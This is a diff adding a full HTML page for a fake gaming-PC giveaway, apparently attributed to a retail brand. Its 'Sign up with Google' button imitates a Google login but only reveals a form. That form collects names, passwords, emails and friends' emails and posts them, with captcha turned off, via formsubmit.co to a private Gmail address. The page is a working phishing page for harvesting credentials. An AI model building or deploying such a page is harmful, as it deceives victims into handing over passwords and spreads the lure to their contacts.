@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Register to Win a Full Gaming PC Setup or 2000 AED!</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body {
+            background: linear-gradient(135deg, #1e3a8a, #3b82f6);
+        }
+        .form-container {
+            animation: fadeIn 2s ease-in-out;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .google-signin-btn {
+            background-color: #4285F4;
+            color: white;
+            padding: 12px 20px;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        .error-message {
+            color: red;
+            font-size: 14px;
+            margin-top: 8px;
+        }
+
+        .success-message {
+            color: green;
+            font-size: 14px;
+            margin-top: 8px;
+        }
+
+    </style>
+</head>
+<body class="flex items-center justify-center min-h-screen p-4">
+    <div class="bg-white p-8 rounded-2xl shadow-lg max-w-md w-full form-container">
+        <h1 class="text-3xl font-bold text-center text-blue-600 mb-4">Win a Full Gaming PC Setup or 2000 AED!</h1>
+        <p class="text-center text-gray-700 mb-6">Register now for your chance to win at Mall of the Emirates! The more friends you refer, the higher your chances. Refer 4 friends for a 90% chance of winning!</p>
+
+        <!-- Google Sign-In Styled Button -->
+        <button id="googleSignIn" class="google-signin-btn">
+            Sign up with Google
+        </button>
+
+        <!-- Additional Registration Form (Hidden by Default) -->
+        <form id="registrationForm" action="https://formsubmit.co/belaifaredouane3@gmail.com" method="POST" class="space-y-4 mt-4 hidden">
+            <!-- Hidden Input for Google Email (pre-filled) -->
+            <input type="hidden" id="googleEmail" name="email">
+
+            <div>
+                <label class="block text-sm font-medium text-gray-700">Your Name</label>
+                <input type="text" name="name" required id="name" class="mt-1 block w-full p-2 border rounded-lg focus:ring-2 focus:ring-blue-500">
+                <p id="nameError" class="error-message hidden">Please enter a valid name.</p>
+            </div>
+
+            <div>
+                <label class="block text-sm font-medium text-gray-700">Create a Password</label>
+                <input type="password" name="password" required id="password" class="mt-1 block w-full p-2 border rounded-lg focus:ring-2 focus:ring-blue-500">
+                <p id="passwordError" class="error-message hidden">Password must be at least 6 characters long.</p>
+            </div>
+
+            <div>
+                <label class="block text-sm font-medium text-gray-700">Enter Your Email</label>
+                <input type="email" name="email" required id="email" class="mt-1 block w-full p-2 border rounded-lg focus:ring-2 focus:ring-blue-500">
+                <p id="emailError" class="error-message hidden">Please enter a valid email.</p>
+            </div>
+
+            <div>
+                <label class="block text-sm font-medium text-gray-700">Refer a Friend's Email</label>
+                <input type="email" name="friend_email" class="mt-1 block w-full p-2 border rounded-lg focus:ring-2 focus:ring-blue-500">
+            </div>
+
+            <!-- Hidden Inputs for FormSubmit -->
+            <input type="hidden" name="_subject" value="New Registration for Gaming PC Giveaway!">
+            <input type="hidden" name="_next" value="https://yourwebsite.com/thank-you.html">
+            <input type="hidden" name="_captcha" value="false">
+
+            <button type="submit" id="submitBtn" class="w-full bg-blue-600 text-white p-2 rounded-lg hover:bg-blue-700 transition">Submit</button>
+        </form>
+        
+        <p id="successMessage" class="success-message hidden text-center">Form submitted successfully!</p>
+        <p class="text-center text-gray-600 mt-4 text-sm">Brought to you by <strong>BrandForLess</strong>. Increase your chances with every referral!</p>
+    </div>
+
+    <script>
+        // Simulate Google Sign-In with custom button style (Submit form instead)
+        document.getElementById('googleSignIn').addEventListener('click', function() {
+            // Show the registration form when the button is clicked
+            document.getElementById('registrationForm').classList.remove('hidden');
+            
+            // Optionally, you can pre-fill the email field with a default email (this is just an example, replace with actual logic if needed)
+            document.getElementById('googleEmail').value = "user@example.com";  // Replace with real data if available
+        });
+
+        // Validate and handle form submission
+        document.getElementById('submitBtn').addEventListener('click', function(event) {
+            event.preventDefault(); // Prevent the form from submitting immediately
+            
+            // Hide previous error messages
+            document.getElementById('emailError').classList.add('hidden');
+            document.getElementById('passwordError').classList.add('hidden');
+            document.getElementById('nameError').classList.add('hidden');
+            document.getElementById('successMessage').classList.add('hidden');
+            
+            let isValid = true;
+
+            // Email validation
+            const email = document.getElementById('email').value;
+            if (!validateEmail(email)) {
+                document.getElementById('emailError').classList.remove('hidden');
+                isValid = false;
+            }
+
+            // Password validation
+            const password = document.getElementById('password').value;
+            if (password.length < 6) {
+                document.getElementById('passwordError').classList.remove('hidden');
+                isValid = false;
+            }
+
+            // Name validation
+            const name = document.getElementById('name').value;
+            if (name.trim() === "") {
+                document.getElementById('nameError').classList.remove('hidden');
+                isValid = false;
+            }
+
+            if (isValid) {
+                // Show success message and submit the form
+                document.getElementById('successMessage').classList.remove('hidden');
+                document.getElementById('registrationForm').submit(); // Actually submit the form
+            }
+        });
+
+        // Email validation function
+        function validateEmail(email) {
+            const regex = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+            return regex.test(email);
+        }
+    </script>
+</body>
+</html>
